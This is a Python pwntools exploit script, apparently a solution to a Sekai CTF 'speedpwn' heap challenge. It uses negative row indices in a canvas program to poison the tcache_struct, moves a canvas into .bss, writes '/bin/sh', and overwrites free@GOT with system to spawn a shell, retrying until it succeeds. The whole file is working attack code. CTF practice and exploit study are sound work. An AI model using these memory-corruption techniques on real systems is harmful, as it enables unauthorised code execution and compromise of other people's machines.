#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
continue
"""

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
exe = "./chall_patched"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

# io = start()
while True:
    try:
        io = start(s)
        # io = remote("speedpwn-2.chals.sekai.team", 1337, ssl=True)

        def resize(row, column):
            sla(b"> ", b"r " + str(row).encode() + b" " + str(column).encode())

        def paint(row, column, value):
            sla(b"> ", b"p " + str(row).encode() + b" " + str(column).encode() + b" " + hex(value).encode())

        # Resize to 16 x 16 so row & col align to memory
        resize(16, 16)
        # Another to add index into tcache_struct
        resize(16, 16)

        # Attack old canvas address in tcache_struct 
        # Old size is 0x111 -> row -326 from new canvas
        # Target .bss here so we can attack GOT
        target = 0x404070 

        for i in range(8):
            info(hex(p64(target)[i]))
            paint(-326, i + 8, p64(target)[i])

        # New 16x16 canvas will be on .bss
        resize(16, 16)

        # Write "/bin/sh" to the start of the canvas
        binsh = b"/bin/sh\00"
        for i in range(8):
            paint(0, i, binsh[i])

        system = 0x858750

        # Use negative index to change free@got -> system
        # Index will be row -6
        for i in range(3):
            paint(-7, i, p64(system)[i])

        # Free canvas to trigger system
        resize(1,1)

        sl(b"echo phus")
        # io.interactive()
        # io.close()
        if io.recv(4) == b"phus":
            break
    except:
        try:
            io.close()
        except:
            pass
io.interactive()
